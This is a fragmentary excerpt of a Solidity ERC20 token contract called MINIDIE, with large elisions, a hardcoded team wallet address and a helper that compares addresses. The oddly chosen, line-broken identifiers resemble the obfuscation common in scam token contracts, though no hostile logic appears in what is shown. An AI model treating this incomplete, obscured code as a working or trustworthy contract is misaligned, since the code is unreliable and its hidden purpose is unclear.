...
contract  MINIDIE is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "MINIDIE";
    string private _symbol = "MINIDIE";
    uint8 private _decimals = 9;
    address payable public allocate
;
    ...
    mapping (address => bool) public accordance
;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xb38Ea3048A4831C1556479dd9912994D757E2eF9));
        allocate
 = payable(address(0xb38Ea3048A4831C1556479dd9912994D757E2eF9));
...
, bool activate
,address adequate
) private pure returns(bool){return activate
 && (((accustomed
 == adequate
)));}
